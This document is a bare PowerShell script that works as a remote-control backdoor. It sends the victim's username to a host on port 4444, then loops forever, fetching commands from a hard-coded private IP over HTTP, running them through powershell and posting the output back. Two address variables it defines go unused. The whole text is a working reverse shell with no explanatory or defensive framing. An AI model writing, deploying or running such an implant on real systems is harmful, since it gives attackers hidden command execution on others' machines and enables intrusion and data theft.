$URIREC = "192.168.2.37:80"

$URISEND = "192.168.2.37:4444"

$hmal += "New Connection from"

$hmal += whoami

$Response = Invoke-WebRequest -Timeout 1 -Method Post -URI 192.168.2.190:4444 -Body $hmal -UseBasicParsing

while ($true)
{

	$I = Invoke-WebRequest -Timeout 1 'http://192.168.2.190:80' | Select-Object -Expand Content

	$MAIN = powershell /c $I

	if($MAIN -eq $FALSE){
	}else{ 
	$Response = Invoke-WebRequest -Method Post -URI 192.168.2.190:4444 -Body $MAIN -UseBasicParsing	
	}
	sleep 1
}




